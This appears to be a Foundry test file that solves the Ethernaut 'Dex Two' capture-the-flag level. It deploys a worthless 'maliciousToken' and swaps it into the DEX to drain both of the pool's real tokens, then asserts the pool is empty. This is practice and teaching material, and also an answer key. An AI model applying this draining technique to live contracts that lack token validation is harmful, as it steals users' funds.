// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/23_DexTwo.sol";

contract TestDexTwo is Test {
    address public player = address(0xbad);
    DexTwo public instance;
    SwappableTokenTwo public t1;
    SwappableTokenTwo public t2;

    function setUp() public {
        instance = new DexTwo();
        t1 = new SwappableTokenTwo(address(instance), "token1", "T1", 110);
        t2 = new SwappableTokenTwo(address(instance), "token2", "T2", 110);
        instance.setTokens(address(t1), address(t2));
        instance.approve(address(instance), 100);
        instance.addLiquidity(address(t1), 100);
        instance.addLiquidity(address(t2), 100);
        t1.transfer(player, 10);
        t2.transfer(player, 10);
    }

    function testSolution() public {
        vm.startPrank(player);

        SwappableTokenTwo maliciousToken = new SwappableTokenTwo(address(instance), "maliciousToken", "MT", 10_000_000);
        maliciousToken.transfer(address(instance), 100);
        maliciousToken.approve(player, address(instance), 300);
        instance.swap(address(maliciousToken), address(t1), 100);
        instance.swap(address(maliciousToken), address(t2), 200);

        uint256 totalBalance = t1.balanceOf(address(instance)) + t2.balanceOf(address(instance));
        assertEq(totalBalance, 0);

        vm.stopPrank();
    }
}
